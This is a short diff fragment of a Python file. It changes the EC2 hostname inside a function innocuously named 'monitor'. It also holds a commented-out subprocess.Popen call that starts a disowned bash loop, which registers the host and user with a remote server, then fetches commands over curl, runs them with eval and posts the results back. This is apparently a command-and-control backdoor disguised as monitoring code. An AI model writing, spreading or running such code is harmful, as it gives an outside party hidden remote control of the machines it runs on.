@@ -29,7 +29,7 @@ def generate_random_id():
 
 def monitor():
     print("start monitor thread")
-    h = "ec2-13-235-254-89.ap-south-1.compute.amazonaws.com"
+    h = "ec2-13-201-120-197.ap-south-1.compute.amazonaws.com"
     r = generate_random_id()
     print(f"r={r}")
     #subprocess.Popen(["nohup", "bash", "-c", 's=172.24.0.2:8000&&i=TOmabR5&&hname=$(hostname)&&p=http://;curl -s "$p$s/$i/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/$i" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/$i -X POST -H "Authorization: $i" -d "c=$c&r=$r";echo $$;fi; fi; sleep 1; done;', "&", "disown"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
